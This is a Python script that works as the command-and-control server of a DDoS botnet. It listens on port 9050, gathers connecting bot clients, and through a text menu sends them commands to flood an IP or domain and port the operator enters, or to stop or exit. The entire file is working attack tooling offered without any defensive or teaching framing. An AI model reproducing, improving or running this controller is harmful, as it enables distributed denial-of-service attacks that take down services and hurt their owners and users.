#!/usr/bin/python3

import socket
import threading
import time
import os
import signal


clientlist = [] #Use to store all the IP address
first_time = False #To tell is it first connection

def client_print():
    print("\n" * 70)
    os.system('clear')
    print(f"{len(clientlist)} Clients Connected")
    print("\n1.Start DOS\n2.End DOS\n3.Exit\n\nChoice: ", end='')


def DoS():
    while True:
        time.sleep(1)
        choice = input("")

        if choice == "1":
            # Choose IP/Domain Name to attack
            ip = input("IP/Domain to attack: ").encode("utf-8")
            port = input("Port to attack: ").encode("utf-8")
            for client in clientlist:
                client.send(b'DOS-' + ip + b'-' + port)
            print("Initiating DDOS...")
            time.sleep(3)

        elif choice == "2":
            # Choose IP/Domain Name to attack
            for client in clientlist:
                client.send(b'stop')
            print("Stopping DDOS...")
            time.sleep(3)

        elif choice == "3":
            for client in clientlist:
                client.send(b'Exit')
                client.close()
            os.kill(os.getpid(), signal.SIGTERM)

        else:
            print("Invalid option, please enter again")

        client_print()


def socketConn():
    global clientlist, first_time, s
    # Reserve a port for service.
    port = 9050
    ip = ""

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind to the port
    s.bind((ip, port))
    # Wait for client connection. 3 clients
    s.listen(9999999)
    print("No device found. Socket is listening...")

    while True:
        # Establish connection with client.
        client, address = s.accept()
        clientlist.append(client)

        if not first_time:
            dos = threading.Thread(target=DoS)
            dos.start()
        first_time = True

        connect = threading.Thread(target=client_print)
        connect.start()


# Calls the socketConn function
socketConn()
